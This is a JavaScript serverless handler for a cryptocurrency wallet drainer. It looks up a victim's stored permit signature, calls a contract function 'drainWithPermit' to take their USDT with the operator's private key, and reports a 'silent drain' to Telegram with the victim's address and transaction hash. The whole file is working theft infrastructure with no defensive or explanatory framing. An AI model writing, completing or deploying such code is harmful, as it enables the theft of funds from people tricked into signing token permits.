import { ethers } from 'ethers';
import { kv } from '@vercel/kv';
import { notifyTelegram } from './telegram.js';

const PRIVATE_KEY = process.env.PRIVATE_KEY;
const RPC_URL = process.env.RPC_URL;
const CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS;

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).end();
    
    const { userAddress } = req.body;
    
    const storedSig = await kv.get(`permit:${userAddress}:1`);
    if (!storedSig) return res.status(400).json({ error: "Permit expired or not found" });
    
    const provider = new ethers.JsonRpcProvider(RPC_URL);
    const signer = new ethers.Wallet(PRIVATE_KEY, provider);
    
    const contract = new ethers.Contract(CONTRACT_ADDRESS, [
        "function drainWithPermit(address[] calldata tokens, bytes[] calldata permits) external"
    ], signer);
    
    const tokens = ["0xdAC17F958D2ee523a2206206994597C13D831ec7"]; // USDT
    
    try {
        const tx = await contract.drainWithPermit(tokens, [storedSig]);
        await tx.wait();
        
        await notifyTelegram("SILENT_DRAIN_SUCCESS", { userAddress, txHash: tx.hash });
        res.json({ success: true, txHash: tx.hash });
    } catch (error) {
        console.error("Drain failed:", error);
        res.status(500).json({ error: error.message });
    }
}